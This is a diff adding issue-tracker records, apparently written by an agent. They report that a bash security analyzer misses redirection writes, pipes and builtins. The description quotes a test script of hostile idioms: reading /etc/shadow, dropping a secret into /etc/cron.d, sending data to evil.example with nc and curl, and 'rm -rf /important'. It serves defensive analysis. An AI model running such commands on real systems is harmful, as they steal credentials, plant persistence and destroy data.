@@ -1,0 +1,33 @@
+- op: create  # d173
+  at: '2026-08-13T20:30:18Z'  # d173
+  by: agent  # d173
+  actor: jgstern_agent  # d173
+  clock: 1  # d173
+  nonce: d173  # d173
+  data:  # d173
+    kind: invariant  # d173
+    title: "The bash analyzer emits edges only for external-command launches and sourcing; redirection writes (echo $SECRET > /path), pipes, builtins and env-var flow produce no edges"  # d173
+    status: violated  # d173
+    priority: 2  # d173
+    parent:  # d173
+    tags:  # d173
+    - security  # d173
+    - analyzer  # d173
+    - taint  # d173
+    isbefore: []  # d173
+    duplicate_of: []  # d173
+    not_duplicate_of: []  # d173
+    pr_ref:  # d173
+    description: "Found while pricing \"make bash analyzable via the launch channel\" as a route to\nunblock the self-proof (INV-dabuf). MEASURED, and it kills that route.\n\nTHE BASH ANALYZER SEES LAUNCHES AND SOURCING, AND IS BLIND TO WRITES. Measured\non an 8-statement script exercising the common dangerous idioms:\n\n    SECRET=\"${API_KEY}\"                       # env read     -> NO edge\n    TOKEN=$(cat /etc/shadow)                   # cmd subst    -> `cat` launch only\n    echo \"$SECRET\" > /etc/cron.d/pwned         # REDIRECT WRITE -> NO edge\n    printf '%s' \"$TOKEN\" >> /var/log/leak      # append write -> NO edge\n    cat \"$SECRET\" | nc evil.example 443        # pipe         -> `cat`,`nc` launches\n    curl -d \"$SECRET\" https://evil.example/x   # launch       -> command_launch\n    rm -rf /important                          # launch       -> command_launch\n    source ./other.sh                          # source       -> `sources` edge\n\n  5 edges total: cat/nc/curl/rm as command_launch, plus one `source` edge.\n  The three WRITES to host paths (echo>, printf>>, and the cron-dropper itself)\n  produced ZERO edges.\n\nSTRUCTURAL, not a fixture artifact. bash.py dispatches on exactly three node\ntypes: function_definition, declaration_command (variable_assignment ->\nSYMBOL, no dataflow edge), command (external program -> command_launch).\nRedirection (`>`/`>>`/heredoc), pipelines, builtins (echo/printf/read), and\nenv-var dataflow are unhandled. So `echo $SECRET > /etc/cron.d/pwned` -- the\nsame cron-dropper INV-larol was filed about, written with a builtin+redirect\ninstead of `curl -o` -- is INVISIBLE.\n\nWHY THIS MAKES \"BASH IS TAINT-SUPPORTED VIA THE LAUNCH CHANNEL\" UNSAFE. The\ncoverage gate asks \"did this language produce call edges\" (bash did -- the\nlaunches) and method_starved (per-catalogued-primitive). A redirection write\nis neither a call nor a catalogued primitive, so NO gate check covers it. If\nbash were marked supported on the strength of its launch edges, a script whose\nonly real write is `echo secret > /path` would pass the gate and a\n{boundary: fs_write, must_not_exist} claim would CONFIRM -- trading today's\nhonest `inconclusive` for a false confirm through a NEW hole (redirection\nblindness) that is not the one INV-larol closed (catalogue-strip). Not measured\nend-to-end because bash is not currently supported; reasoned from the gate's\nchecks, and flagged as reasoned-not-measured.\n\nCONSEQUENCE FOR INV-dabuf: launch-channel bash support is NOT the self-proof's\nanswer. The self-proof's bash blocker is a LANGUAGE-CENSUS blocker (bash\npresent, no catalogue), and python->bash is a subprocess boundary with no edge\ninto bash symbols, so bash's internal writes never connect to the python-sourced\nclaims anyway. The self-proof answer stays: declared scope + packaging (WI-kozos)\nor accept-and-disclose. Making bash analyzable for WRITES is separate, larger\nanalyzer work (model redirection targets as fs_write, pipe RHS as the\ndownstream sink) and is not required for the self-proof.\n\nWHAT A USER-SUPPLIED CATALOGUE CAN AND CANNOT DO (owner asked about a template).\nA catalogue row matches a NAMED command, so a template CAN declare a project's\nlaunched tools as sinks -- `aws s3 cp` as net_send, a custom `./deploy` as\nsubprocess -- and that is real value on the launch surface. It CANNOT express\n`> file`: redirection is syntax, not a call, so no row reaches it. Any bash\ntemplate must disclaim that redirections, pipes, builtins and env-var flow are\nunmodelled -- i.e. the template covers WHICH launched commands do what, never\nthe shell's own I/O."  # d173
+    fields:  # d173
+      statement: "A bash script's host-filesystem writes must be visible to the boundary analysis, or a fs_write claim over it cannot be trusted. VIOLATED: bash.py dispatches on function_definition / declaration_command / command only, so  and  emit ZERO edges. The launch surface (curl/rm/nc/custom tools) IS emitted as command_launch. Consequence: marking bash taint-supported on the strength of launch edges would let a redirection-write script pass the coverage gate and CONFIRM 'never writes host_fs' -- a false confirm through a hole distinct from INV-larol's catalogue-strip."  # d173
+      root_cause: "The bash analyzer models command invocation, not shell I/O semantics: redirection operators, pipelines, and builtins are unhandled node types, and variable_assignment becomes a symbol with no dataflow edge. A catalogue cannot patch this -- redirection is syntax, not a named call -- so it is analyzer work (emit fs_write for a redirect target, wire pipe RHS as the sink), not catalogue completeness."  # d173
+- op: update  # dff2
+  at: '2026-08-13T20:33:19Z'  # dff2
+  by: agent  # dff2
+  actor: jgstern_agent  # dff2
+  clock: 2  # dff2
+  nonce: dff2  # dff2
+  set:  # dff2
+    fields:  # dff2
+      statement: "A bash script's host-filesystem writes must be visible to the boundary analysis, or a fs_write claim over it cannot be trusted. VIOLATED: bash.py dispatches on function_definition / declaration_command / command only, so 'echo $SECRET > /etc/cron.d/pwned' and 'printf ... >> /var/log/leak' emit ZERO edges (measured: 5 edges for an 8-statement script, all command_launch for cat/nc/curl/rm plus one source edge; the three redirect writes produced none). The launch surface IS emitted; the write surface is invisible. Marking bash taint-supported on the strength of launch edges would let a redirection-write script pass the coverage gate and CONFIRM 'never writes host_fs' -- a false confirm through a hole distinct from INV-larol's catalogue-strip."  # dff2
